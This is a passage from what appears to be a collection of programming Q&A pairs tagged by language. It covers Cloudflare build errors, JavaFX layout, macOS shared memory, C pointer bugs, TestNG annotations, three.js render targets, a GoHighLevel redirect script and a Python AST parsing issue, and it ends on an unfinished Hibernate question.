2022-07-30T19:05:14.317986Z       3 │ var url = require('url')
2022-07-30T19:05:14.318109Z         ╵                   ~~~~~
2022-07-30T19:05:14.318238Z 
2022-07-30T19:05:14.318505Z   The package ""url"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.318665Z 
2022-07-30T19:05:14.319392Z ✘ [ERROR] Could not resolve ""util""
2022-07-30T19:05:14.319808Z 
2022-07-30T19:05:14.319968Z     node_modules/sequelize/lib/utils/deprecations.js:32:37:
2022-07-30T19:05:14.320241Z       32 │ var import_util = __toModule(require(""util""));
2022-07-30T19:05:14.320559Z          ╵                                      ~~~~~~
2022-07-30T19:05:14.320699Z 
2022-07-30T19:05:14.320823Z   The package ""util"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.321042Z 
2022-07-30T19:05:14.326057Z ✘ [ERROR] Could not resolve ""fs""
2022-07-30T19:05:14.327248Z 
2022-07-30T19:05:14.328892Z     node_modules/sequelize/lib/dialects/sqlite/connection-manager.js:2:19:
2022-07-30T19:05:14.329459Z       2 │ const fs = require(""fs"");
2022-07-30T19:05:14.329823Z         ╵                    ~~~~
2022-07-30T19:05:14.33005Z  
2022-07-30T19:05:14.330876Z   The package ""fs"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.331054Z 
2022-07-30T19:05:14.331281Z ✘ [ERROR] Could not resolve ""assert""
2022-07-30T19:05:14.331476Z 
2022-07-30T19:05:14.331604Z     node_modules/sequelize/lib/model.js:21:23:
2022-07-30T19:05:14.33172Z        21 │ const assert = require(""assert"");
2022-07-30T19:05:14.331829Z          ╵                        ~~~~~~~~
2022-07-30T19:05:14.331936Z 
2022-07-30T19:05:14.33237Z    The package ""assert"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.332543Z 
2022-07-30T19:05:14.332673Z ✘ [ERROR] Could not resolve ""util""
2022-07-30T19:05:14.332789Z 
2022-07-30T19:05:14.333338Z     node_modules/sequelize/lib/data-types.js:2:21:
2022-07-30T19:05:14.334026Z       2 │ const util = require(""util"");
2022-07-30T19:05:14.334206Z         ╵                      ~~~~~~
2022-07-30T19:05:14.33441Z  
2022-07-30T19:05:14.334627Z   The package ""util"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.334959Z 
2022-07-30T19:05:14.335106Z ✘ [ERROR] Could not resolve ""fs""
2022-07-30T19:05:14.335239Z 
2022-07-30T19:05:14.33556Z      node_modules/pg-connection-string/index.js:4:17:
2022-07-30T19:05:14.335971Z       4 │ var fs = require('fs')
2022-07-30T19:05:14.336165Z         ╵                  ~~~~
2022-07-30T19:05:14.336703Z 
2022-07-30T19:05:14.337207Z   The package ""fs"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.337373Z 
2022-07-30T19:05:14.337521Z ✘ [ERROR] Could not resolve ""fs""
2022-07-30T19:05:14.337657Z 
2022-07-30T19:05:14.337784Z     node_modules/firebase-admin/lib/app/lifecycle.js:21:19:
2022-07-30T19:05:14.337911Z       21 │ const fs = require(""fs"");
2022-07-30T19:05:14.338056Z          ╵                    ~~~~
2022-07-30T19:05:14.338211Z 
2022-07-30T19:05:14.338342Z   The package ""fs"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.338478Z 
2022-07-30T19:05:14.33862Z  ✘ [ERROR] Could not resolve ""util""
2022-07-30T19:05:14.338756Z 
2022-07-30T19:05:14.339295Z     node_modules/sequelize/lib/utils/logger.js:59:37:
2022-07-30T19:05:14.339765Z       59 │ var import_util = __toModule(require(""util""));
2022-07-30T19:05:14.339936Z          ╵                                      ~~~~~~
2022-07-30T19:05:14.340093Z 
2022-07-30T19:05:14.340237Z   The package ""util"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.


...............


2022-07-30T19:05:14.89587Z  
2022-07-30T19:05:14.896004Z error during build:
2022-07-30T19:05:14.896124Z Error: Build failed with 234 errors:
2022-07-30T19:05:14.896252Z node_modules/@fastify/busboy/deps/dicer/lib/Dicer.js:1:31: ERROR: Could not resolve ""stream""
2022-07-30T19:05:14.896371Z node_modules/@fastify/busboy/deps/dicer/lib/Dicer.js:2:25: ERROR: Could not resolve ""util""
2022-07-30T19:05:14.896477Z node_modules/@fastify/busboy/deps/dicer/lib/HeaderParser.js:1:29: ERROR: Could not resolve ""events""
2022-07-30T19:05:14.896588Z node_modules/@fastify/busboy/deps/dicer/lib/HeaderParser.js:2:25: ERROR: Could not resolve ""util""
2022-07-30T19:05:14.896701Z node_modules/@fastify/busboy/deps/dicer/lib/PartStream.js:1:25: ERROR: Could not resolve ""util""
2022-07-30T19:05:14.896818Z ...
2022-07-30T19:05:14.896942Z     at failureErrorWithLog (/opt/buildhome/repo/node_modules/esbuild/lib/main.js:1621:15)
2022-07-30T19:05:14.897064Z     at /opt/buildhome/repo/node_modules/esbuild/lib/main.js:1263:28
2022-07-30T19:05:14.897441Z     at runOnEndCallbacks (/opt/buildhome/repo/node_modules/esbuild/lib/main.js:1176:65)
2022-07-30T19:05:14.897756Z     at buildResponseToResult (/opt/buildhome/repo/node_modules/esbuild/lib/main.js:1261:7)
2022-07-30T19:05:14.898025Z     at /opt/buildhome/repo/node_modules/esbuild/lib/main.js:1374:14
2022-07-30T19:05:14.898328Z     at /opt/buildhome/repo/node_modules/esbuild/lib/main.js:675:9
2022-07-30T19:05:14.898627Z     at handleIncomingPacket (/opt/buildhome/repo/node_modules/esbuild/lib/main.js:772:9)
2022-07-30T19:05:14.898889Z     at Socket.readFromStdout (/opt/buildhome/repo/node_modules/esbuild/lib/main.js:641:7)
2022-07-30T19:05:14.90122Z      at Socket.emit (node:events:527:28)
2022-07-30T19:05:14.901427Z     at addChunk (node:internal/streams/readable:315:12)
2022-07-30T19:05:14.917314Z Failed: build command exited with code: 1
2022-07-30T19:05:16.243508Z Failed: an internal error occurred

This is happening just after I added some server side code so that might be the reason, but Sveltekit supports that through cloudflare workers so I don't understand why.
","I ran into this same issue trying to migrate from Vercel to Cloudflare Pages and it looks like Cloudflare Workers (which is what Pages uses under the hood for functions) only supports Node.js packages that uses webpack or another polyfill bundler since it is not Node.js. It only runs JavaScript code using the V8 engine on the edge network not in a Node.js runtime so any Node.js package that has Node.js specific dependencies like fs and net/http are not compatible.
Here is a list of Cloudflare Workers compatible packages and here is some further reading on how Node.js and Cloudflare Workers work together.
To get your project deployed to Cloudflare Pages you will need to refactor your code to only use Node.js packages from the above list of compatible packages or implement any functionality using plain JavaScript if a compatible package does not exist.
",javascript
how to make labels fully visible in a gridpane,"I have a GridPane where labels and textfields alternate (label, textfield, label, textfield). The labels can be of any width and it is never known in advance. I need to ensure that the labels are always fully visible, meaning they are not truncated (...), and only the TextFields shrink. This is my code:
public class NewMain extends Application {

    @Override
    public void start(Stage stage) {
        GridPane gridPane = new GridPane();
        gridPane.setHgap(10);
        gridPane.setVgap(10);
        gridPane.setPadding(new Insets(10));

        Label label1 = new Label(""Label AAAAA BBBBB:"");
        label1.setMinWidth(Region.USE_COMPUTED_SIZE);
        TextField textField1 = new TextField();
        textField1.setMinWidth(10);
        GridPane.setHgrow(textField1, Priority.ALWAYS);
        Label label2 = new Label(""Label CCCCCC DDDDDD:"");
        label2.setMinWidth(Region.USE_COMPUTED_SIZE);
        TextField textField2 = new TextField();
        GridPane.setHgrow(textField2, Priority.ALWAYS);
        textField2.setMinWidth(10);

        gridPane.add(label1, 0, 0);
        gridPane.add(textField1, 1, 0);
        gridPane.add(label2, 2, 0);
        gridPane.add(textField2, 3, 0);

        ColumnConstraints labelColumn = new ColumnConstraints();
        labelColumn.setHgrow(Priority.NEVER);

        ColumnConstraints textFieldColumn = new ColumnConstraints();
        textFieldColumn.setMinWidth(50);
        textFieldColumn.setHgrow(Priority.ALWAYS);

        gridPane.getColumnConstraints().addAll(
            labelColumn, textFieldColumn,
            labelColumn, textFieldColumn
        );

        Scene scene = new Scene(gridPane, 600, 100);
        stage.setTitle(""GridPane Single Row Test"");
        stage.setScene(scene);
        stage.show();
    }


    public static void main(String[] args) {
        launch(args);
    }
}

And this is the result:

Could anyone say how to do it?
","The computed size for a label takes into account the fact that it can be truncated. The preferred size will give you the size it ""wants to be"", and it would prefer not to be truncated. Just set the minimum width to Region.USE_PREF_SIZE:
public class NewMain extends Application {

    @Override
    public void start(Stage stage) {
        GridPane gridPane = new GridPane();
        gridPane.setHgap(10);
        gridPane.setVgap(10);
        gridPane.setPadding(new Insets(10));

        Label label1 = new Label(""Label AAAAA BBBBB:"");
        label1.setMinWidth(Region.USE_PREF_SIZE);
        TextField textField1 = new TextField();
        textField1.setMinWidth(10);
        Label label2 = new Label(""Label CCCCCC DDDDDD:"");
        label2.setMinWidth(Region.USE_PREF_SIZE);
        TextField textField2 = new TextField();
        textField2.setMinWidth(10);

        gridPane.add(label1, 0, 0);
        gridPane.add(textField1, 1, 0);
        gridPane.add(label2, 2, 0);
        gridPane.add(textField2, 3, 0);


        Scene scene = new Scene(gridPane, 600, 100);
        stage.setTitle(""GridPane Single Row Test"");
        stage.setScene(scene);
        stage.show();
    }


    public static void main(String[] args) {
        launch(args);
    }
}

",java
why is my shared memory reading zeroes on macos,"I am writing an interface to allow communication between a main program written in C and extension scripts written in python and run in a separate python interpreter process. The interface uses a UNIX socket for small amounts of data and POSIX shared memory for large arrays. The C program handles all creation, resource tracking and final unlinking of shared memory.
This works perfectly on Linux. I can transfer data between the two processes as expected using the shm.
However when exactly the same code runs on MacOS, although it runs without error the shared memory is always full of zeroes when read from the other process to the one that populated the memory. e.g. if I write image data into the shm from C, and read it from python, it's all zero. If I write image data into the shm from python and read it from C, again it's all zero.
I create the shm in C as follows: (some error handling lines removed for clarity)
    void *shm_ptr = NULL;
    snprintf(shm_name_ptr, 30, ""/%08x%08x%08x%04x"", my_random_int(), my_random_int(), my_random_int(), my_random_int());
    debug_print(""shm name: %s\n"", shm_name_ptr);
    *fd = shm_open(shm_name_ptr, O_CREAT | O_RDWR | O_EXCL, S_IRUSR | S_IWUSR);
    ftruncate(*fd, aligned_size) == -1);
    shm_ptr = mmap(NULL, (size_t) aligned_size, PROT_READ | PROT_WRITE,
                MAP_SHARED, *fd, 0);
    *shm_ptr_ptr = shm_ptr;

And then the details are passed to python through the socket. I haven't reproduced the details of that because the code is fairly long with #ifdefs for Windows etc., but the socket mechanism provably works and I can print the shm name as it is created in C and as it is received in python and show that they are the same:
shm name: /b6c31655f708d0e20760b60bc483
SHM allocation: Original size: 25941632, Aligned size: 25944064, Page size: 4096
Truncating shm file to 25941632 bytes
log: b'/b6c31655f708d0e20760b60bc483'

(The first lines of text are printed from C, the last is printed from python.)
The __init__ function from the wrapper class I'm using in python to open the shm is shown below:
class SharedMemoryWrapper:
    """"""
    Wrapper class to handle shared memory creation and cleanup across platforms.
    """"""
    def __init__(self, name: str, size: int):
        self.name = name
        self.size = size  # Store intended size separately
        self._shm = None
        try:
            # First try to attach to existing shared memory
            self._shm = shared_memory.SharedMemory(name=self.name)
            unregister(self._shm._name, ""shared_memory"")
        except FileNotFoundError:
            # If it doesn't exist, create new shared memory
            print(""Existing SHM not found, creating a new one..."")
            self._shm = shared_memory.SharedMemory(name=self.name, create=True, size=self.size)

(The unregister() call is there because the SHM is always allocated, tracked and cleaned up by the C program and passed to the python program, so this suppresses warning messages about shm leaks when the python script exits.)
Once the name and size are received over the socket the shared memory object is initialized using SharedMemoryWrapper(name=name_from_socket, size=size_from_socket)
On Linux the try block works and the shm is opened correctly, however on MacOS I see the message ""Existing SHM not found, creating a new one...""
Please can someone explain what is different about MacOS here, and how can I fix it so that the existing shm is opened correctly?
","I'm a colleague of OP and have looked into the issue we were having.
When creating a shared memory object on the C side, use a leading slash in its name:
 int fd = shm_open(""/mem"", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);

When accessing it on the Python side, do not use a leading slash as it is added automatically on POSIX systems:
shm = shared_memory.SharedMemory(name=""mem"", create=False)

And now Python is able to find the object.

supplemental edit by OP: this is indeed the answer, and having updated the start of the __init__ function above to:
    def __init__(self, name: str, size: int):
        if os.name != ""nt"":
            name = name.lstrip('/') # Remove leading '/' on POSIX systems
                                    # because SharedMemory.__init__ will add it back
        self.name = name
        self.size = size  # Store intended size separately
        self._shm = None
...

everything now works.
",c
why does my c code for printing out characters to the screen not work,"I'm trying to create a C program that is supposed to print out ASCII ""characters"" in my terminal. As I starting point, I started with the letters A-K. I have defined an array with characters as follows:
#define F_CHARS 11 // Number of font characters (in this case A-K)
#define F_WIDTH 5 // Width of each font character, including space
#define F_HEIGHT 5 
// Height of each font character
char font[] = 
"" xx  xxx   xxx xxx  xxxx xxxx  xx  x  x x       x x  x ""\
""x  x x  x x    x  x x    x    x    x  x x       x x x  ""\
""xxxx xxx  x    x  x xx   xxx  x xx xxxx x       x xx   ""\
""x  x x  x x    x  x x    x    x  x x  x x    x  x x x  ""\
""x  x xxx   xxx xxx  xxxx x     xx  x  x x     xx  x  x "";


Moreover, I have defined a ""screen"" to print the characters to:
#define S_WIDTH 40
#define S_HEIGHT 10
char screen[S_WIDTH*S_HEIGHT];

I finally have defined a function myprint, which I want to call with the X and Y of where to place the start of the character relative to the start of my screen. I will also provide a string to this function, which matches the text to be printed out to the terminal. For example myprint(5,2,""A"") should draw the letter A on row 2, column 5 (zero-indexed).
Here is the myprint definition:
void myprint(int x, int y, char* strings){
    while (*strings != 0){ // until not null terminated
        // get corresponding char in font array
        int font_start_index = 0+(*strings-65)*F_WIDTH;
        // iterate over the current font
        for (int i=0;i<F_WIDTH;i++){
            for (int a=0;a<F_HEIGHT;a++){
                // Get current character to draw
                int font_index = font_start_index+i+a*F_WIDTH*(F_CHARS-1);
                char font_character = *(font+font_index);
                // Figure out where to draw it
                int screen_index = x+i+(y+a)*S_WIDTH;
                *(screen+screen_index) = font_character;
            }

        }
        x+=F_WIDTH;
        strings++;
    }
}

Here is finally the whole program, with a test to draw ""A"" on row 2, column 5 included:
#include <stdio.h>
#define S_WIDTH 40
#define S_HEIGHT 10
#define F_CHARS 11
#define F_WIDTH 5
#define F_HEIGHT 5 // Number of font characters (in this case A-K)
// Witdth of each font character, including space
// Height of teach font character
char font[] = 
"" xx  xxx  xxx  xxx  xxxx xxxx xx   x x  x  x x  x  x  x  x     x x   ""\
""x  x x  x x  x x  x x    x    x  x x x  x x  x x x  x x x x x  x x   ""\
""xxxx xxx  x  x x  x xx   xxx  x  x x x  x xx   xxx  x  x xx  xxxx x  ""\
""x  x x  x x  x x  x x    x    x  x x x  x x    x    x  x x x  x  x x ""\
""x  x xxx  xxx  xxx  xxxx x    x  xx x   x x    xx   x  x x  x x  x x "";

char screen[S_WIDTH*S_HEIGHT];
void myprint(int x, int y, char* strings){
    while (*strings != 0){ // until not null terminated
        // get corresponding char in font array
        int font_start_index = 0+(*strings-65)*F_WIDTH;
        // iterate over the current font
        for (int i=0;i<F_WIDTH;i++){
            for (int a=0;a<F_HEIGHT;a++){
                // Get current character to draw
                int font_index = font_start_index+i+a*F_WIDTH*(F_CHARS-1);
                char font_character = *(font+font_index);
                // Figure out where to draw it
                int screen_index = x+i+(y+a)*S_WIDTH;
                *(screen+screen_index) = font_character;
            }

        }
        x+=F_WIDTH;
        strings++;
    }
}
int main(){
    // Clear screen
    for(int i=0;i<S_WIDTH*S_HEIGHT;i++){
        screen[i] = '.';
    }
    // Call my print with a user defined message
    myprint(5,2,""A"");
    // Print the screen
    char * spos = screen;
    for(int i=0; i<S_HEIGHT; i++){
        for(int j=0; j<S_WIDTH; j++){
            printf(""%c"",*spos++);
        }
        printf(""\n"");
    }
    return 0;
}

If the whole program above is run, then myprint(5,2,""A""); is called. I would expect it to print out the character definition of A in column 5, row 2. My code prints out something, but it does not look like an A:
........................................
........................................
..... xx  ..............................
..... x  x..............................
.....  x x..............................
..... x x ..............................
.....xxx x..............................
........................................
........................................
........................................

Help is appreciated!
","Bug found! F_CHARS-1 should be F_CHARS:
(Credit to @Yunnosch for suggesting this)
#include <stdio.h>
#define S_WIDTH 40
#define S_HEIGHT 10
#define F_CHARS 11
#define F_WIDTH 5
#define F_HEIGHT 5
char font[] = 
"" xx  xxx   xxx xxx  xxxx xxxx  xx  x  x x       x x  x ""\
""x  x x  x x    x  x x    x    x    x  x x       x x x  ""\
""xxxx xxx  x    x  x xx   xxx  x xx xxxx x       x xx   ""\
""x  x x  x x    x  x x    x    x  x x  x x    x  x x x  ""\
""x  x xxx   xxx xxx  xxxx x     xx  x  x x     xx  x  x "";

char screen[S_WIDTH*S_HEIGHT];
void myprint(int x, int y, char* strings){
    while (*strings != 0){ // until not null terminated
        // get corresponding char in font array
        int font_start_index = 0+(*strings-65)*F_WIDTH;
        // iterate over the current font
        for (int i=0;i<F_WIDTH;i++){
            for (int a=0;a<F_HEIGHT;a++){
                // Get current character to draw
                int font_index = font_start_index+i+a*F_WIDTH*F_CHARS;
                char font_character = *(font+font_index);
                // Figure out where to draw it
                int screen_index = x+i+(y+a)*S_WIDTH;
                *(screen+screen_index) = font_character;
            }

        }
        x+=F_WIDTH;
        strings++;
    }
}
int main(){
    // Clear screen
    for(int i=0;i<S_WIDTH*S_HEIGHT;i++){
        screen[i] = '.';
    }
    // Call my print with a user defined message
    myprint(5,2,""A"");
    // Print the screen
    char * spos = screen;
    for(int i=0; i<S_HEIGHT; i++){
        for(int j=0; j<S_WIDTH; j++){
            printf(""%c"",*spos++);
        }
        printf(""\n"");
    }
    return 0;
}

",c
how can i fix quoterror 39a39 is a pointer did you mean to use 39gt39quot when attempting to run my c code,"This is the code I tried to run:
#include <stdio.h>

struct cow{
  int moo;  
};

void newm(struct cow *a){
    *a.moo = 5;
}

int main() {
    // Write C code here
    printf(""Hello world"");
    struct cow a;
    newm(&a);
    printf(""hallo %i"", a.moo);
    

    return 0;
}

When running the code I get the following error message:
gcc /tmp/2RZ9WOHWdH.c -lm
/tmp/2RZ9WOHWdH.c: In function 'newm':
/tmp/2RZ9WOHWdH.c:9:9: error: 'a' is a pointer; did you mean to use '->'?
    9 |     *(a).moo = 5;
      |         ^
      |         ->


How can I fix ""error: 'a' is a pointer; did you mean to use '->'?"" when attempting to run my C code?
","In this expression
*a.moo = 5;

it is supposed that the data member moo is a pointer that is dereferenced.
But actually it is a that is a pointer.
The postfix member access operator . has a higher precedence than the unary operator *.
So instead you need to write either
a->moo = 5;

or
( *a ).moo = 5;

",c
do java compilers commonly precompute hashcodes of final fields,"I have a HashMap-intensive Java program in which several classes have hashcodes computed from final fields. For example: 
public class Foo {
    private final int bar;
    private final String zot;

    @Override
    public int hashCode() {
        final int prime = 31;
        int result = 1;
        result = prime * result + bar;
        result = prime * result + zot.hashCode();
        return result;
    }
}

It's possible for the compiler to observe that the hashcode cannot change after object initialization, and precompute it into an additional private final field. Do current Java compilers do this, like the one in Oracle JDK 7? I could disassmble the .class file, but then the JIT may also do this kind of optimization at runtime and I would not see it there. Anyway, I'm interested in other cases besides this one, so it would be great to find a general approach for identifying any optimizations the compiler does automatically.
","
Do current Java compilers do this, like the one in Oracle JDK 7? 

The javac does almost no optimisations.

I could disassmble the .class file, 

You might not like what you see in terms of optimisations. ;)

but then the JIT may also do this kind of optimization at runtime and I would not see it there. 

If the JIT did optimise this, you wouldn't see it and in fact it doesn't do this.  This is why String caches it's hashCode() at runtime, explicitly in code.
",java
what are the advantages of chainofresponsibility vs lists of classes,"Recently, I was discussing with another programmer the best way to refactor a huge(1000 lines) method full of ""if"" statements.
The code is written in Java, but I guess this issue could happen in other languages such as C# as well.
To solve this problem, he suggested using a chain-of-responsibility pattern.
He proposed having a base ""Handler"" class. Then, ""Handler1"", ""Handler2"", etc. would extend ""Handler"".
Then, handlers would have a ""getSuccessor"" method, which would either return null(if it was the last of the chain) or the next Handler of the chain.
Then, a ""handleRequest(Request)"" function would either deal with Request, or pass it to the next of the chain and, if none of the previous solutions worked, it would return just null or throw an exception.
To add a new Handler to the chain, the coder would go to the last element of the chain and tell it there was a new element. To do something, he'd just call handleRequest on the first element of the chain.
To solve this problem, I suggested using a different approach.
I'd have a base ""Handler"" class as well, with ""Handler1"", ""Handler2"", just like the previous method mentioned.
However, there would be no ""getSuccessor"" method. Instead, I'd have a Collection class with a list of handlers(a Vector, an ArrayList, or whatever is best in this case).
The handleRequest function would still exist, but it wouldn't propagate the call to the next handlers. It would just process the request or return null.
To handle a request, one would use
for(Handler handle : handlers){
    result = handle.handleRequest(request);
    if(result!=null) return result;
}
throw new CouldNotParseRequestException(); //just like in the other approach

Or, to prevent code duplication, a ""parseRequest(request)"" method could be added to the collection class.
To add a new handler, one would go to the collection constructor(or static{} block, or something equivaleng) and simply add the code ""addHandler(new Handler3());"".
Exactly what advantages of chain-of-responsibility am I missing with this approach? Which method is best(assuming there is a best method)? Why? What potential bugs and issues can each design method cause?
For those who need context, here is what the original code looked like:
if(x instanceof Type1)
{
//doSomething1
} else if(x instanceof Type2)
{
//doSomething2
}
//etc.

","I like your idea with collection better than those successors. It makes it easy and clear to manipulate this set of handlers: the collections interface is well known and everybody understands how to iterate over a List or what not.
If you use this successor way suggested by a friend, take care not to fall into a very deep recursion (unless your platform supports tail calls, I don't know if JVMs are capable of that).
I wouldn't recommend adding any methods to the collection. You get much more complicated design that's harder to comprehend and harder to modify. There are two separate concerns: storing a set of handlers and the interpretation of this handlers as a chain of responsibility. A method that handles requests by iterating over a collection is on higher level of abstraction than collection housekeeping methods, therefore shouldn't belong to collection interface.
",java
using testng after annotation,"I am automating a web page, and in a class I have several tests and when i run them through testng all of them the @Aftertest isn´t being invoked so the only test that works is the first one, because when the first test finished, it doens't call the aftertest to close the driver instance and start a new one. There are my methods:
@BeforeSuite
public void printInfo() {
    Utilidades.addInformationTest();
}

@BeforeTest
public void loggerUser() throws Exception {
    initializeSelenium(""VerificacionUI_FraudMonitor_Issuer"");
    Utilidades.printInfo(""Cargando datos de variables."");
    setCMSModulo(modulo);
    setUsuario(usuario);
    setContraseña(contraseña);
    startAccess();
    parentWindowHandle = driver.getWindowHandle();
}

@AfterTest
public void shutDownSelenium() {
    driver.quit();
}

and then come all of my six @Test
If any could tell me what im doing wrong, because im clueless. I no each test works individually becuase i've tried it.
Thanks.
","I think you might want to try @AfterMethod, instead of @AfterTest.
@AfterTest only runs once, after all of the @Test methods have run.
See the TestNG annotations documentation:
https://testng.org/annotations.html
@AfterMethod: The annotated method will be run after each test method.
@AfterTest: The annotated method will be run after all the test methods belonging to the classes inside the  tag have run.
Good Luck!
",java
render second scene to texture not working,"I'm trying to learn something new in three.js. My goal is to be able to use what a second camera sees in a separate scene as a texture for the main scene.
Or alternatively to be able to use what a second camera sees in the main scene as a texture. But i only see a black screen. I posted my code for it here. I hope someone recognizes where my mistake is, because I just can't figure it out.
In 3 steps:

texture = second camera view
material use texture
apply material ordinary to a mesh

E.g.
var camera, controls, scene, renderer, container, aspect;
    
function main() {
init();
animate();
}

function init() {
    renderer = new THREE.WebGLRenderer( { antialias: true } );
    renderer.setPixelRatio( window.devicePixelRatio ); 
    renderer.shadowMap.enabled = true; 
    renderer.shadowMap.type = THREE.PCFSoftShadowMap;
             
    container = document.getElementById('container');
    renderer.setSize(container.clientWidth, container.clientHeight);
    container.appendChild( renderer.domElement );

    aspect = container.clientWidth / container.clientHeight; 
    scene = new THREE.Scene();
    scene.background = new THREE.Color( 0x000000 );
    
    camera = new THREE.PerspectiveCamera( 60, container.clientWidth / container.clientHeight, 1, 1000000 );
    
    camera.position.set(0, 0, 200);

    controls = new THREE.OrbitControls( camera, renderer.domElement );
    controls.enableZoom = true;
    controls.enabled = true;
    controls.target.set(0, 0, 0);
    
    //-----End three basic setups-----


    var tex = generateTexture(renderer);
    

    var plane = new THREE.Mesh(
        new THREE.PlaneBufferGeometry(100.0, 100.0),
        new THREE.MeshBasicMaterial({
           color: 0x00caff,
           map: tex,
           side: THREE.DoubleSide,
        })
    );
    scene.add(plane);
}//-------End init----------

function animate() {
    requestAnimationFrame( animate );  
    render();    
}//-------End animate----------

function render() { 
    camera.updateMatrixWorld();
    camera.updateProjectionMatrix(); 
    renderer.render(scene, camera); 
}//-------End render----------


function generateTexture(renderer) {
    var resolution = 2000;
    var textureScene = new THREE.Scene();
    textureScene.background = new THREE.Color(0x404040);

    var renderTarget = new THREE.WebGLRenderTarget(resolution, resolution, {minFilter: THREE.LinearFilter, magFilter: THREE.LinearFilter, format: THREE.RGBFormat});
        
    var textureCamera = new THREE.PerspectiveCamera(60, aspect, 0.1, 100000.0);
        
    textureCamera.position.set(0, 0, 200);
    textureCamera.lookAt(0, 0, 0);
    
    var geometry = new THREE.SphereGeometry( 60, 32, 16 ); 
    var material = new THREE.MeshBasicMaterial( { color: 0xffff00 } ); 
    var sphere = new THREE.Mesh( geometry, material); 
    textureScene.add( sphere );
    
    renderer.render(textureScene, textureCamera, renderTarget, true);
        
    var texture = renderTarget.texture;
        
    renderer.setRenderTarget(null);
        
    return texture;
}//----- End generateTexture ------

","Are you copying this approach from a tutorial? What version of three.js are you using? I'm asking because you're using renderer.render(scene, camera, target, true); but the docs state that .render() only accepts two arguments, so passing a renderTarget doesn't do anything.
I recommend you copy the approach in this demo, you can see the source code by clicking on the < > icon. The essential part is as follows:
// Render first scene into texture
renderer.setRenderTarget( renderTarget );
renderer.clear();
renderer.render( textureScene, textureCamera );

// Render full scene to canvas
renderer.setRenderTarget( null );
renderer.clear();
renderer.render( scene, camera );

",javascript
how to redirect a user after login to specific page in go highlevel using javascript,"By default when a user logs in GHL, he is sent to ""/dashboard"" by default. But I want the user to redirect to Contacts page instead --> ""contacts/smart_list/All"". GHL allows custom JavaScript, so I came up with the following script:
But it only works if I am on the ""/dashboard"" page already and refresh it manually.
I want this to work right after the user logs in and when dashboard is loading, the script should be loaded and do its work and redirects the user to ""contacts/smart_list/All"" page instead.
I know this is possible as other people have done it, but I don't know what I am doing wrong.
<script> if (window.location.href.match(""location/xkTaFgTklXH0jB/dashboard"")) { window.location = ""https://app.gohighlevel.com/v2/location/xkTaFgTklXH0jB/contacts/smart_list/All""; } </script>
","I ended up doing this, I don't know how ideal this solution, but it works at least. I'll appreciate if someone can offer a better and more optimized solution.
    <script>
    // Function to check if the current URL matches the pattern and redirect if needed
    function checkURL() {
        // Define the ID to match in the URL
        var idToMatch = 'hdbmyw0Yhd7Wo6allOl6';
        
        // Get the current URL
        var currentURL = window.location.href;
        
        // Check if the current URL contains the ID followed by '/dashboard'
        if (currentURL.includes('/' + idToMatch + '/dashboard')) {
            var newURL = currentURL.replace('/dashboard', '/contacts/smart_list/All');
            
            // Redirect
            window.location.href = newURL;
        }
    }
    
   checkURL();
    
    // Set up an interval to periodically check the URL
    setInterval(checkURL, 1000);
    
    </script>

",javascript
remove backslash continuation character,"I'm trying to parse some code with AST, but I'm having an issue because of backslash continuation character.
When I have a continuation character \, textwrap will not manage to dedent the code, I would like to know how to get rid of it.
code = """"""
    def foo():
        message = ""This is a very long message that will probably need to wrap at the end of the line!\n \
And it actually did!""
""""""

import textwrap
print textwrap.dedent(code)

import ast
ast.parse(textwrap.dedent(code))

I'm adding more details to clarify the question:
I have a module nemo.py with the following content:
class Foo(object):

    def bar(self):
        message = ""This is a very long message that will probably need to wrap at the end of the line!\n \
And it actually did!""

and the main module trying to parse the code:
import ast
import nemo
import inspect
import textwrap

code = str().join(inspect.getsourcelines(nemo.Foo.bar)[0])
ast.parse(textwrap.dedent(code))

And the traceback:
Traceback (most recent call last):
  File ""/Users/kelsolaar/Documents/Development/Research/_BI.py"", line 7, in <module>
    ast.parse(textwrap.dedent(code))
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/ast.py"", line 37, in parse
    return compile(source, filename, mode, PyCF_ONLY_AST)
  File ""<unknown>"", line 1
    def bar(self):
    ^
IndentationError: unexpected indent

","This is because you misunderstood what textwrap.dedent() does. 
It only remove any common leading white spaces. In your case there's no common leading white space, therefore nothing is removed. 
Moreover, what you want is actually \\ instead of \n \ in this case. This is because you actually want what is printed to be parsed. \\ will print only one \ and it's what you want. \n \ will print a new line within ""..."" clause which is invalid.
Now consider this code:
>>> code = """"""
    def foo():
        message = ""This is a very long message that will probably need to wrap at the end of the line! \\
    And it actually did!""
""""""

>>> print textwrap.dedent(code)

def foo():
    message = ""This is a very long message that will probably need to wrap at the e
nd of the line! \
And it actually did!""

>>> ast.parse(textwrap.dedent(code))
<_ast.Module object at 0x10e9e5bd0>

In this case there is common leading white spaces, and hence they are removed.

Edit:
If you want to get rid of the \ all together, you can consider using """"""My sentence"""""" for message in def bar. 
",python
how to fix orghibernatelazyinitializationexception  could not initialize proxy  no session,"I get the following exception:
Exception in thread ""main"" org.hibernate.LazyInitializationException: could not initialize proxy - no Session
    at org.hibernate.proxy.AbstractLazyInitializer.initialize(AbstractLazyInitializer.java:167)
    at org.hibernate.proxy.AbstractLazyInitializer.getImplementation(AbstractLazyInitializer.java:215)
    at org.hibernate.proxy.pojo.javassist.JavassistLazyInitializer.invoke(JavassistLazyInitializer.java:190)
    at sei.persistence.wf.entities.Element_$$_jvstc68_47.getNote(Element_$$_jvstc68_47.java)
    at JSON_to_XML.createBpmnRepresantation(JSON_to_XML.java:139)
    at JSON_to_XML.main(JSON_to_XML.java:84)

when I try to call from main the following lines:
